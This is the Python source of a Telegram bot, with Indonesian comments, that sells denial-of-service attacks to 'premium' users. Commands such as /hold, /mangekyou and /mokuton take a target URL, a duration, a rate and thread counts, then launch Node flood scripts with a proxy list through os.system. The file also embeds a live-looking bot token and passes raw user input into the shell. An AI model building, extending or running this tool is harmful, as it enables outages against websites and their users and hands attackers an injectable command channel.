import telebot
import os
import sqlite3

# Inisialisasi bot dan token
bot = telebot.TeleBot("6819857187:AAGeNAOqvxSaZa1LbEIcT5N3Bpa-hwBWwOU")  # Ganti YOUR_TELEGRAM_BOT_TOKEN dengan token bot Anda

# Fungsi penanganan perintah /visit
@bot.message_handler(commands=['hold'])
def visit_url(message):
    # Mendapatkan argumen url dan time dari perintah
    args = message.text.split()[1:]
    if len(args) < 4:
        bot.reply_to(message, 'Perintah tidak valid. Gunakan format: /hold url time rate thread')
        return

    url = args[0]
    time = args[1]
    rate = args[2]
    thread = args[3]

    # Memeriksa apakah pengguna adalah pengguna premium
    user_id = message.from_user.id
    if is_premium_user(user_id):
        # Mengeksekusi perintah menggunakan os.system
        # Ganti your_command dengan perintah yang sesuai
        os.system("node HOLD.js " + url + " " + time + " " + rate + " " + thread + " p.txt")

        bot.reply_to(message, 'Succecfuly To Broadcast Attack To All Server')
    else:
        bot.reply_to(message, 'Anda harus menjadi pengguna premium untuk menggunakan fitur ini.')
        
@bot.message_handler(commands=['rinenggan'])
def rinenggan(message):
    # Mendapatkan argumen url dan time dari perintah
    args = message.text.split()[1:]
    if len(args) < 2:
        bot.reply_to(message, 'Perintah tidak valid. Gunakan format: /rinenggan url time thread')
        return

    url = args[0]
    time = args[1]
    thread = args[2]

    # Memeriksa apakah pengguna adalah pengguna premium
    user_id = message.from_user.id
    if is_premium_user(user_id):
        # Mengeksekusi perintah menggunakan os.system
        # Ganti your_command dengan perintah yang sesuai
        os.system("node tls2" + url + " " + time + " " + thread + " p.txt rand")

        bot.reply_to(message, 'Succecfuly To Broadcast Attack To All Server')
    else:
        bot.reply_to(message, 'Anda harus menjadi pengguna premium untuk menggunakan fitur ini.')

@bot.message_handler(commands=['senpou'])
def rand(message):
    # Mendapatkan argumen url dan time dari perintah
    args = message.text.split()[1:]
    if len(args) < 2:
        bot.reply_to(message, 'Perintah tidak valid. Gunakan format: /senpou url time thread')
        return

    url = args[0]
    time = args[1]
    thread = args[2]

    # Memeriksa apakah pengguna adalah pengguna premium
    user_id = message.from_user.id
    if is_premium_user(user_id):
        # Mengeksekusi perintah menggunakan os.system
        # Ganti your_command dengan perintah yang sesuai
        os.system("node get.js " + url + " " + time + " " + thread + " p.txt")

        bot.reply_to(message, 'Succecfuly To Broadcast Attack To All Server')
    else:
        bot.reply_to(message, 'Anda harus menjadi pengguna premium untuk menggunakan fitur ini.')

@bot.message_handler(commands=['rand'])
def rand(message):
    # Mendapatkan argumen url dan time dari perintah
    args = message.text.split()[1:]
    if len(args) < 1:
        bot.reply_to(message, 'Perintah tidak valid. Gunakan format: /rand url time')
        return

    url = args[0]
    time = args[1]

    # Memeriksa apakah pengguna adalah pengguna premium
    user_id = message.from_user.id
    if is_premium_user(user_id):
        # Mengeksekusi perintah menggunakan os.system
        # Ganti your_command dengan perintah yang sesuai
        os.system("node rand " + url + " " + time + " ")

        bot.reply_to(message, 'Succecfuly To Broadcast Attack To All Server')
    else:
        bot.reply_to(message, 'Anda harus menjadi pengguna premium untuk menggunakan fitur ini.')
        
@bot.message_handler(commands=['mangekyou'])
def rand(message):
    # Mendapatkan argumen url dan time dari perintah
    args = message.text.split()[1:]
    if len(args) < 3:
        bot.reply_to(message, 'Perintah tidak valid. Gunakan format: /mangekyou url time')
        return

    url = args[0]
    time = args[1]
    thread = args [2]
    rate = args [3]

    # Memeriksa apakah pengguna adalah pengguna premium
    user_id = message.from_user.id
    if is_premium_user(user_id):
        # Mengeksekusi perintah menggunakan os.system
        # Ganti your_command dengan perintah yang sesuai
        os.system("node laja.js rand " + url + " " + time + " " + thread + " " + rate + " p.txt undefined")

        bot.reply_to(message, 'Succecfuly To Broadcast Attack To All Server')
    else:
        bot.reply_to(message, 'Anda harus menjadi pengguna premium untuk menggunakan fitur ini.')

@bot.message_handler(commands=['mokuton'])
def rand(message):
    # Mendapatkan argumen url dan time dari perintah
    args = message.text.split()[1:]
    if len(args) < 1:
        bot.reply_to(message, 'Perintah tidak valid. Gunakan format: /mokuton url time thread')
        return

    url = args[0]
    time = args[1]
    thread = args[2]

    # Memeriksa apakah pengguna adalah pengguna premium
    user_id = message.from_user.id
    if is_premium_user(user_id):
        # Mengeksekusi perintah menggunakan os.system
        # Ganti your_command dengan perintah yang sesuai
        os.system("node rand " + url + " " + time + " " + thread + " p.txt 120 get")

        bot.reply_to(message, 'Succecfuly To Broadcast Attack To All Server')
    else:
        bot.reply_to(message, 'Anda harus menjadi pengguna premium untuk menggunakan fitur ini.')
        

# Fungsi penanganan perintah /addpremium
@bot.message_handler(commands=['addpremium'])
def add_premium(message):
    # Memeriksa apakah pengguna yang mengirim perintah adalah admin
    if message.from_user.id != 5907253656:
        bot.reply_to(message, 'Anda tidak memiliki izin untuk menggunakan perintah ini.')
        return

    # Mendapatkan argumen user_id dari perintah
    args = message.text.split()[1:]
    if len(args) < 1:
        bot.reply_to(message, 'Perintah tidak valid. Gunakan format: /addpremium user_id')
        return

    user_id = args[0]

    # Menambahkan pengguna premium ke database
    add_premium_user(user_id)

    bot.reply_to(message, 'Pengguna dengan ID ' + user_id + ' telah ditambahkan sebagai pengguna premium.')

# Fungsi untuk memeriksa apakah pengguna adalah pengguna premium
def is_premium_user(user_id):
    # Membuka koneksi ke database
    conn = sqlite3.connect('premium_users.db')
    c = conn.cursor()

    # Mengecek apakah pengguna ada di database
    c.execute("SELECT * FROM premium_users WHERE user_id = ?", (user_id,))
    result = c.fetchone()

    # Menutup koneksi ke database
    conn.close()

    # Mengembalikan True jika pengguna ada di database, False jika tidak
    return result is not None

# Fungsi untuk menambahkan pengguna premium ke database
def add_premium_user(user_id):
    # Membuka koneksi ke database
    conn = sqlite3.connect('premium_users.db')
    c = conn.cursor()

    # Menambahkan pengguna ke database
    c.execute("INSERT INTO premium_users (user_id) VALUES (?)", (user_id,))

    # Menyimpan perubahan ke database
    conn.commit()

    # Menutup koneksi ke database
    conn.close()

# Menjalankan bot
bot.polling()